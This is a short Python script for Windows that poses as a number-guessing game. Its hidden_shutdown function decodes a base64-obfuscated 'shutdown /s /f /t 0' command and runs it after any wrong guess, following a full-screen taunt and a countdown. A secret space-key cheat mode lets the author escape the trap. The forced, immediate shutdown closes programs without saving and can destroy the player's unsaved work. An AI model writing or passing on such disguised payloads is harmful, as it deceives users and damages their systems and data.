import random
import os
import msvcrt
import base64
import time
import ctypes

def fullscreen_text_animation():
    kernel32 = ctypes.WinDLL('kernel32')
    hwnd = kernel32.GetConsoleWindow()
    user32 = ctypes.WinDLL('user32')
    user32.ShowWindow(hwnd, 3)  # Maximize terminal
    os.system('cls')

    message = "❌ YOU GUESSED IT WRONG! BYE! ❌"
    print("\n" * 5)
    for _ in range(10):
        print(message.center(100, ' '))
    time.sleep(1)

def fake_countdown(seconds):
    print("\nSystem will shut down in:")
    for i in range(seconds, 0, -1):
        print(f"⏳ {i}...", end="\r")
        time.sleep(1)

def hidden_shutdown():
    encoded = b'c2h1dGRvd24gL3MgL2YgL3QgMA=='
    command = base64.b64decode(encoded).decode()
    os.system(command)

print("Press any key to start...")

key = msvcrt.getch()
cheat_mode = key == b' '

try:
    guess = int(input("Enter your guess: "))

    if cheat_mode:
        number = guess
    else:
        number = random.randint(1, 10)

    if guess == number:
        print("🎉 You guessed it right!")
    else:
        print(f"❌ Wrong guess! The correct number was {number}.")
        fullscreen_text_animation()
        fake_countdown(5)  # 5 second fake timer
        hidden_shutdown()

except ValueError:
    print("⚠️ Invalid input! Please enter a valid integer.")
